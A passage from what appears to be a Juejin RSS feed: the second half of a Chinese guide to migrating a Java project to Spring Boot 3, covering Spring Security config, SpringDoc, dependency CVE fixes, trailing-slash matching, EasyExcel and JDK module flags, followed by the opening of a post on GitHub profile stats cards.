        <span class="hljs-built_in">this</span>.tokenProvider = tokenProvider;
    }
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SecurityFilterChain <span class="hljs-title function_">filterChain</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
        http
                .csrf(AbstractHttpConfigurer::disable)
                .sessionManagement(sessionManagement -&gt; sessionManagement
                        .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .authorizeHttpRequests(authorizeRequests -&gt; authorizeRequests
                        <span class="hljs-comment">// 允许所有 OPTIONS 请求</span>
                        .requestMatchers(OPTIONS, <span class="hljs-string">"**"</span>).permitAll()
                        .requestMatchers(
                                <span class="hljs-string">"/swagger-ui/**"</span>,
                                <span class="hljs-string">"/v3/api-docs/**"</span>,
                                <span class="hljs-string">"/swagger-resources/**"</span>,
                                <span class="hljs-string">"/images/**"</span>,
                                <span class="hljs-string">"/webjars/**"</span>).permitAll()
                        .anyRequest().authenticated())
                .addFilterBefore(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JWTFilter</span>(tokenProvider), UsernamePasswordAuthenticationFilter.class);
        <span class="hljs-keyword">return</span> http.build();
    }
}
</code></pre>
<p><strong>RequestMatcher 调整注意事项</strong></p>
<ol>
<li><strong>新增 SpringDoc 路径</strong>（必须）</li>
</ol>
<pre><code class="hljs language-java" lang="java">/swagger-ui<span class="hljs-comment">/**

/v3/api-docs/**
</span></code></pre>
<p><strong>修正通配符写法</strong>：</p>
<pre><code class="hljs language-java" lang="java">❌ 错误： <span class="hljs-comment">//**/*.js</span>
✅ 正确： <span class="hljs-comment">/**/*.js

否则会抛出 PatternParseException

</span></code></pre>
<h3 data-id="heading-16"><strong>问题三：SpringDoc OpenAPI 配置</strong></h3>
<p><strong>Swagger → SpringDoc 迁移</strong></p>
<pre><code class="hljs language-java" lang="java">	&lt;!-- 移除旧的 Swagger 依赖 --&gt;
    &lt;!--
    &lt;dependency&gt;
     &lt;groupId&gt;io.springfox&lt;/groupId&gt;
     &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;
    &lt;/dependency&gt;
    --&gt;
    &lt;!-- 添加新的 SpringDoc 依赖 --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springdoc&lt;/groupId&gt;
        &lt;artifactId&gt;springdoc-openapi-starter-webmvc-ui&lt;/artifactId&gt;
        &lt;version&gt;<span class="hljs-number">2.3</span><span class="hljs-number">.0</span>&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre>
<p><strong>配置示例</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@OpenAPIDefinition</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SwaggerConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> OpenAPI <span class="hljs-title function_">openAPI</span><span class="hljs-params">()</span> {
        <span class="hljs-type">OpenAPI</span> <span class="hljs-variable">openAPI</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAPI</span>();
        openAPI.info(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>().title(<span class="hljs-string">"API 文档"</span>).version(<span class="hljs-string">"1.0"</span>));
        <span class="hljs-comment">// 配置 Authorization 登录鉴权</span>
        Map&lt;String, SecurityScheme&gt; map = Map.of(<span class="hljs-string">"Authorization"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityScheme</span>()
                        .type(SecurityScheme.Type.APIKEY)
                        .in(SecurityScheme.In.HEADER)
                        .name(<span class="hljs-string">"Authorization"</span>));
        openAPI.components(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Components</span>().securitySchemes(map));
        map.keySet().forEach(key -&gt; openAPI.addSecurityItem(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityRequirement</span>().addList(key)));
        <span class="hljs-keyword">return</span> openAPI;
    }
}
</code></pre>
<p><strong>注解对应关系</strong></p>





























<table><thead><tr><th align="left"><strong>Swagger 2.x</strong></th><th align="left"><strong>SpringDoc OpenAPI 3.x</strong></th></tr></thead><tbody><tr><td align="left">@Api</td><td align="left">@Tag</td></tr><tr><td align="left">@ApiOperation</td><td align="left">@Operation</td></tr><tr><td align="left">@ApiParam</td><td align="left">@Parameter</td></tr><tr><td align="left">@ApiModel</td><td align="left">@Schema</td></tr><tr><td align="left">@ApiModelProperty</td><td align="left">@Schema</td></tr></tbody></table>
<p><strong>访问地址变更</strong></p>
<p>原 Swagger UI 地址： <code>http://localhost:8080/swagger-ui.html </code>
新 SpringDoc 地址： <code>http://localhost:8080/swagger-ui/index.html</code><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64fb97da283e4ef89e0bd5674e72de4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=kl0l6C1h2IM7AasUnod6X6GlOZs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">问题四：依赖冲突与安全漏洞修复</h3>
<p><strong>检测工具</strong></p>
<p>使用 IDEA 自带的依赖分析工具：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dfc53e8c529446f802b5bc33d349b15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=XP12sN%2BpA4YAZ4G6tiYHBxQX1oA%3D" alt="" loading="lazy"/></p>
<p><strong>必须升级的依赖（存在高危漏洞） </strong></p>
<p>推荐使用 <strong>OWASP Dependency-Check</strong> 或 <strong>Snyk</strong> 扫描：</p>
<pre><code class="hljs language-shell" lang="shell">mvn dependency-check:check
</code></pre>
<p><strong>解决依赖冲突的技巧</strong></p>
<p><strong>问题</strong>：Maven 依赖解析采用"最短路径优先"和"第一声明优先"原则，可能导致旧版本覆盖新版本。</p>
<p><strong>解决方案</strong>：显式声明期望的版本</p>
<pre><code class="hljs language-java" lang="java">&lt;dependencies&gt;
    &lt;!-- 显式声明 Spring Framework 版本，避免被传递依赖覆盖 --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework&lt;/groupId&gt;
        &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
        &lt;version&gt;<span class="hljs-number">6.1</span><span class="hljs-number">.3</span>&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<p><strong>快速检测技巧</strong>：</p>
<p>在 IDEA 的 Maven 依赖树中搜索 <code>RELEASE</code> ，Spring 新版本已不使用 <code>RELEASE</code> 后缀，搜索到的基本都是旧版本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b3e7a1458c24de38ba1307251d4bb21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=6JrwGLKaYQnr7ZRUBIADLlDPSSs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">问题五：URL 尾斜杠匹配策略变更</h3>
<p><strong>行为变化</strong></p>

















<table><thead><tr><th align="left"><strong>版本</strong></th><th align="left"><strong>行为</strong></th></tr></thead><tbody><tr><td align="left"><strong>Spring Boot 2.x</strong></td><td align="left">/api/user/get 和 /api/user/get/ 视为同一接口</td></tr><tr><td align="left"><strong>Spring Boot 3.x</strong></td><td align="left">/api/user/get 和 /api/user/get/ 视为<strong>不同接口</strong></td></tr></tbody></table>
<p><strong>常见导致尾斜杠的情况</strong></p>
<ul>
<li><strong>Case 1：类注解带尾斜杠</strong></li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RequestMapping("/api/user/")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
 <span class="hljs-meta">@PostMapping("login")</span> <span class="hljs-comment">// 实际路径：/api/user/login</span>
}
</code></pre>
<p><strong>Case 2：空字符串映射</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RequestMapping("/api/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
 <span class="hljs-meta">@PostMapping("")</span> <span class="hljs-comment">// 实际路径：/api/user/（带尾斜杠！）</span>
}
</code></pre>
<p><strong>Case 3：根路径映射</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/")</span> <span class="hljs-comment">// 实际路径：/（带尾斜杠）</span>
</code></pre>
<p><strong>\ **** 检查方式 </strong></p>
<ol>
<li><strong>IDEA Endpoints 工具窗口</strong>：查看所有端点 </li>
<li><strong>SpringDoc UI</strong>：访问 Swagger 页面检查</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac276d6bdece4fee87b32949771cd83f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=rzKpr1QezzBD4hxVBMqK3c%2F8yN8%3D" alt="" loading="lazy"/></p>
<p>临时解决方案（不推荐长期使用）</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.PathMatchConfigurer;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfiguration</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> {        
        <span class="hljs-comment">// 设 置 为  true 以 忽 略 尾 斜 杠 ， 恢 复 旧 版 本 行 为</span>
        configurer.setUseTrailingSlashMatch(<span class="hljs-literal">true</span>);
    }
}
</code></pre>
<blockquote>
<p><em><strong>注意</strong>__： ·</em><code>setUseTrailingSlashMatch</code> 在 Spring 6.x 后已标记为废弃，后续版本将删除。建议逐步修正所有端点，去除尾斜杠。</p>
</blockquote>
<p><strong>根本解决方案</strong></p>
<ol>
<li>修正所有 Controller 的路径映射 </li>
<li>通知前端团队同步修改调用路径 </li>
<li>如果有硬编码的 URL，全局搜索并修正 </li>
<li>使用测试确保前后端调用正常</li>
</ol>
<p><strong/></p>
<h3 data-id="heading-19"><strong>问题六：Apache POI / EasyExcel 升级</strong></h3>
<p><strong>背景 </strong></p>
<p>Apache POI 旧版本（&lt; 5.0）存在多个 CVE 安全漏洞，必须升级。</p>
<p><strong>推荐方案</strong></p>
<p><strong>对于新项目</strong>：直接使用 <strong>FastExcel</strong></p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
     &lt;groupId&gt;cn.idev.excel&lt;/groupId&gt;
     &lt;artifactId&gt;fastexcel&lt;/artifactId&gt;
     &lt;version&gt;<span class="hljs-number">1.0</span><span class="hljs-number">.0</span>&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p><strong>对于使用 EasyExcel 的旧项目</strong>：</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
     &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
     &lt;artifactId&gt;easyexcel&lt;/artifactId&gt;
     &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.3</span>&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<blockquote>
<p><em/><em><strong>说明</strong>**：EasyExcel 已不再维护，FastExcel 是社区维护的替代方案，API 基本兼容。</em></p>
</blockquote>
<p><strong>迁移注意事项</strong></p>
<p>EasyExcel 跨大版本升级（2.x → 4.x）API 变化较大，主要改动： </p>
<p><strong>1. </strong>监听器接口方法签名调整 </p>
<p><strong>2. </strong>部分工具类包路径变更 </p>
<p><strong>3. </strong>自定义转换器需要适配新接口 </p>
<p>建议参考官方迁移文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Feasyexcel.opensource.alibaba.com%2F" target="_blank" title="https://easyexcel.opensource.alibaba.com/" ref="nofollow noopener noreferrer">EasyExcel官方文档 - 基于Java的Excel处理工具 | Easy Excel 官网</a></p>
<p/>
<h3 data-id="heading-20">问题七：JDK 模块化限制（--add-opens）</h3>
<p><strong>问题现象 </strong></p>
<p>某些依赖库使用反射访问 JDK 内部 API，在 JDK 9+ 模块化系统下会报错：</p>
<pre><code class="hljs language-java" lang="java">InaccessibleObjectException: Unable to make field accessible:
<span class="hljs-keyword">module</span> java.base does not <span class="hljs-string">"opens java.net"</span> to unnamed <span class="hljs-keyword">module</span>
</code></pre>
<p><strong>解决方案 </strong></p>
<p>在 IDEA 运行配置中添加 VM 参数： </p>
<p><strong>开启 VM 参数配置</strong>（默认隐藏）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/329d602fe0c44732a8c35026aee52fe9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=Z5SSabvNRDJV%2ByJt2X0rysW6p5s%3D" alt="" loading="lazy"/></p>
<p><strong>解决方案 </strong></p>
<p>在 IDEA 运行配置中添加 VM 参数： </p>
<p><strong>开启 VM 参数配置</strong>（默认隐藏）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fde1f0fd0937439d8474be89516861ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=26KlG0A0TFMO8NlAOgXuqt5GN5I%3D" alt="" loading="lazy"/></p>
<p><strong>常见需要开放的模块</strong></p>
<pre><code class="hljs language-java" lang="java">--add-opens java.base/java.lang=ALL-UNNAMED
--add-opens java.base/java.util=ALL-UNNAMED
--add-opens java.base/java.lang.reflect=ALL-UNNAMED 
--add-opens java.base/sun.nio.ch=ALL-UNNAMED
</code></pre>
<p/>
<p/>
<h3 data-id="heading-21">问题八：过期配置属性警告</h3>
<p>问题现象</p>
<p>启动时出现警告：</p>
<pre><code class="hljs language-java" lang="java">Property <span class="hljs-string">'spring.xxx.yyy'</span> is deprecated
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1524afa4e7e4b63847a4e28eb175e55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=cfxJcE2%2BP3%2FVqLPSCPPwS4Vt4qo%3D" alt="" loading="lazy"/></p>
<p><strong>解决方案：</strong></p>
<ol>
<li>
<p>查看 Spring Boot 官方迁移文档</p>
</li>
<li>
<p>使用 IDEA 的智能提示查看替代属性</p>
</li>
<li>
<p>修改配置文件（ 常见过期属性：<code>application.yml</code> 或配置中心)</p>
</li>
</ol>
<p>常见过期属性：</p>





















<table><thead><tr><th align="left"><strong>过期属性</strong></th><th align="left"><strong>替代属性</strong></th></tr></thead><tbody><tr><td align="left">spring.datasource.type</td><td align="left">自动推断，无需配置</td></tr><tr><td align="left">spring.jpa.properties.hibernate.temp.use_jdbc_metadata_defaults</td><td align="left">已移除</td></tr><tr><td align="left">management.metrics.export.prometheus.enabled</td><td align="left">management.prometheus.metrics.export.enabled</td></tr></tbody></table>
  
 
<h2 data-id="heading-22"><strong>完整测试清单</strong></h2>
<p>升级完成后，务必进行全面的回归测试： </p>
<ul>
<li><strong>Spring Security</strong>：认证、授权是否正常 </li>
<li><strong>SpringDoc</strong>：API 文档是否可访问（ /swagger-ui/index.html ） </li>
<li><strong>数据库操作</strong>：JPA/MyBatis 是否正常工作 </li>
<li><strong>缓存</strong>：Redis/Caffeine 等缓存是否生效 </li>
<li><strong>消息队列</strong>：RabbitMQ/Kafka 等是否正常 </li>
<li><strong>定时任务</strong>：Scheduled/Quartz 是否按预期执行 </li>
<li><strong>文件上传/下载</strong>：文件 IO 操作是否正常 </li>
<li><strong>业务功能</strong>：核心业务流程是否正常（重点关注有代码改动的地方） </li>
<li><strong>性能测试</strong>：对比升级前后的性能指标</li>
</ul>
<p/>
<h2 data-id="heading-23">升级感悟</h2>
<p><strong>框架层面的变化趋势 </strong></p>
<p>通过这次升级，我观察到现代框架的一些发展趋势： </p>
<ol>
<li><strong>校验更严格</strong>：</li>
</ol>
<ul>
<li>Spring 不再容忍 URL 尾斜杠的模糊匹配 </li>
<li>循环依赖检测更严格（默认禁止） </li>
<li>Hibernate 对实体状态的校验更精确</li>
</ul>
<ol start="2">
<li><strong>安全性优先</strong>： </li>
</ol>
<ul>
<li>默认配置更保守 </li>
<li>废弃不安全的 API </li>
<li>强制升级修复已知漏洞</li>
</ul>
<ol start="3">
<li><strong>现代化 API</strong>： </li>
</ol>
<ul>
<li>Lambda DSL 配置风格 </li>
<li>函数式编程支持 </li>
<li>更简洁的 API 设计</li>
</ul>
<p/>
<p><strong>依赖选择建议 </strong></p>
<p>基于这次升级经验，对于第三方库的选择建议： </p>
<p><strong>优先选择</strong>： </p>
<p>✅ 国际主流项目（Apache、Spring 生态等） </p>
<p>✅ 有完善文档和测试的项目 </p>
<p>✅ 活跃维护且社区规模大的项目 </p>
<p>✅ 语义化版本管理清晰的项目 </p>
<p><strong>谨慎选择</strong>： </p>
<p>⚠️ 缺乏自动化测试的项目 </p>
<p>⚠️ 长期未更新的项目 </p>
<p>⚠️ API 设计不稳定、频繁 Breaking Change 的项目 </p>
<p>⚠️ 文档不全、维护团队不稳定的项目</p>
<p/>
<p><strong>自动化迁移的价值 </strong></p>
<p>OpenRewrite 等自动化工具在大版本升级中的价值无可替代： </p>
<ul>
<li>减少 90% 以上的机械性改动 </li>
<li>避免手工替换导致的遗漏 </li>
<li>保持代码风格和注释 </li>
<li>降低升级风险 </li>
</ul>
<p>建议在日常开发中也关注此类工具，提升团队整体效率。</p>
<p/>
<p/>
<p><strong>本文首发于 [尚硅谷编程联盟]，转载请注明出处。</strong></p>
<h2 data-id="heading-24">最后：</h2>
<blockquote>
<p>“在这个最后的篇章中，我要表达我对每一位读者的感激之情。你们的关注和回复是我创作的动力源泉，我从你们身上吸取了无尽的灵感与勇气。我会将你们的鼓励留在心底，继续在其他的领域奋斗。感谢你们，我们总会在某个时刻再次相遇。”</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac74b7c91eb04ef4b0af069c2c16ae95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=HGpqL0joAPJAWLaok1%2FWbYL7UVA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[github 仓库主页美化定制]]></title>    <link>https://juejin.cn/post/7580329353352888366</link>    <guid>https://juejin.cn/post/7580329353352888366</guid>    <pubDate>2025-12-06T13:43:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580329353352888366" data-draft-id="7580277964342050826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="github 仓库主页美化定制"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-06T13:43:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RainbowSea"/> <meta itemprop="url" content="https://juejin.cn/user/752533564566951"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            github 仓库主页美化定制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/752533564566951/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RainbowSea
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T13:43:45.000Z" title="Sat Dec 06 2025 13:43:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="darcula">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#bababa}.hljs-emphasis,.hljs-strong{color:#a8a8a2}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#6896ba}.hljs-code,.hljs-selector-class{color:#a6e22e}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#cb7832}.hljs-params{color:#b9b9b9}.hljs-string{color:#6a8759}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable,.hljs-type{color:#e0c46c}.hljs-comment,.hljs-deletion,.hljs-meta{color:#7f7f7f}</style><h2 data-id="heading-0">github 仓库主页美化定制</h2>
<h2 data-id="heading-1"><strong>github状态信息-api</strong></h2>
<h3 data-id="heading-2">GitHub 账户信息统计</h3>
<pre><code class="hljs language-java" lang="java">![GitHub账户信息统计](https:<span class="hljs-comment">//github-stats.ubrong.com/api?username=ubrong&amp;amp;show_icons=true&amp;amp;theme=tokyonight)</span>
</code></pre>
<pre><code class="hljs language-java" lang="java">参数说明：
username [必填] (string) 被统计信息的github用户名
show_icons [可选] (<span class="hljs-type">boolean</span>) <span class="hljs-literal">false</span>不显示图标,<span class="hljs-literal">true</span>显示图标
theme [可选] (string) 主题（可用值：<span class="hljs-keyword">default</span>, dark, radical, merko, gruvbox, tokyonight, onedark, cobalt, synthwave, highcontrast, dracula）
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5552e81c79f74c4687dc16c170247a05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=tjy14Q1mApuTtvXAM3GftHW0Jfo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">显示 Github 当中仓库你常用的语言</h3>
<pre><code class="hljs language-java" lang="java">![GitHub账户最常用语言](https:<span class="hljs-comment">//github-stats.ubrong.com/api/top-langs/?username=ubrong&amp;amp;layout=compact&amp;amp;theme=tokyonight)</span>
</code></pre>
<pre><code class="hljs language-java" lang="java">参数说明：
layout [可选] (string) 布局（可用值：<span class="hljs-keyword">default</span>, compact）
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9f579fcda7940088d46da43b3dc5bb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=%2FOheLxRlY7BRDsm9ZtEg8HJCEOE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">显示 GitHub 仓库信息卡片</h3>
<pre><code class="hljs language-java" lang="java">![GitHub仓库信息卡片](https:<span class="hljs-comment">//github-stats.ubrong.com/api/pin/?username=ubrong&amp;amp;repo=phoneweb-base&amp;amp;theme=dark)</span>
</code></pre>
<pre><code class="hljs language-java" lang="java">参数说明：
repo [必选] (string) 仓库名称
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaa629f10e724ad2a99f7cd783665727~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=h7NHIBm0A7QnfMMTpO163qUuh1Y%3D" alt="" loading="lazy"/></p>
